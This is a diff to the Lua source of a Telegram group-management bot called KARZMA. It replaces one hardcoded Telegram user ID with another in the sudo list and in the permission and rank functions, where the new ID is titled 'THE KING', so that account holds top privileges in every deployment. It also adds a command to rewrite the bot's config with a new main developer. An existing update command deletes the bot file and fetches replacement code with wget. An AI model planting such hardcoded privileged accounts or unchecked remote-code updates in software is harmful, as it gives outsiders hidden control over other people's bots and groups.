@@ -9,7 +9,7 @@ database = redis.connect('127.0.0.1', 6379)
 sudos   = dofile("Info.lua")
 bot_id  = token:match("(%d+)")  
 SUDO = SUDO
-sudo_users = {SUDO,203176343,1033028167}   
+sudo_users = {SUDO,1810368971,1033028167}   
 print([[
 #   #     #     ###     ####   ##   ##     #   
 #  #      #     #  #       #   ##   ##     #   
@@ -129,7 +129,7 @@ return false
 end 
 end
 function Can_or_NotCan(user_id,chat_id)
-if tonumber(user_id) == tonumber(203176343) then  
+if tonumber(user_id) == tonumber(1810368971) then  
 var = true  
 elseif tonumber(user_id) == tonumber(1033028167) then
 var = true  
@@ -161,8 +161,8 @@ end
 return var
 end 
 function Rutba(user_id,chat_id)
-if tonumber(user_id) == tonumber(203176343) then  
-var = 'Telegram Developer'
+if tonumber(user_id) == tonumber(1810368971) then  
+var = '𝗧𝗛𝗘 𝗞𝗜𝗡𝗚'
 elseif tonumber(user_id) == tonumber(1033028167) then
 var = 'Telegram Developer'
 elseif tonumber(user_id) == tonumber(SUDO) then
@@ -949,6 +949,34 @@ echo '*———————————~*\n✺✔{ الــدخــول } ⇎\n
 echo '*———————————~*\n✺✔{ مـده تـشغيـل الـسـيـرفـر }⇎\n*»» '"$uptime"'*'
 ]]):read('*all'))  
 end
+if database:get(bot_id.."Ed:DevBots") then
+if text and text:match("^(%d+)$") then
+local IdDe = text:match("^(%d+)$")
+tdcli_function ({ID = "GetUser",user_id_ = IdDe},function(arg,data) 
+if data.username_ ~= false then
+send(msg.chat_id_,msg.id_, "*✫︙تم تغيير المطور الاساسي بنجاح*")
+local A = io.open("Info.lua", 'w')
+A:write([[
+token = "]]..token..[["
+SUDO = ]]..IdDe..[[  
+UserName = "]]..data.username_..[["
+]])
+A:close()
+database:del(bot_id.."Ed:DevBots")
+dofile('KARZMA.lua')  
+else
+send(msg.chat_id_,msg.id_, "*✫︙عذرا صاحب الايدي لا يمتلك معرف ارسل ايدي اخر*")
+end
+end,nil)
+end
+end
+if text =='تغيير المطور الاساسي ✫' and SudoBot(msg) then
+send(msg.chat_id_, msg.id_,'*✫︙ ارسل ايدي المطور الاساسي الجديد*')
+database:set(bot_id..'Ed:DevBots',true) 
+end
+if text =='تغيير المطور الاساسي ✫' and not SudoBot(msg) then
+send(msg.chat_id_, msg.id_,'*✫︙لا يمكنك تغيير المطور الاساسي*')
+end 
 if text == 'تحديث السورس ✫' and DevKARZMAW(msg) then 
 os.execute('rm -rf KARZMA.lua')
 os.execute('wget https://raw.githubusercontent.com/KARZMATEAM/KARZMA/main/KARZMA.lua')
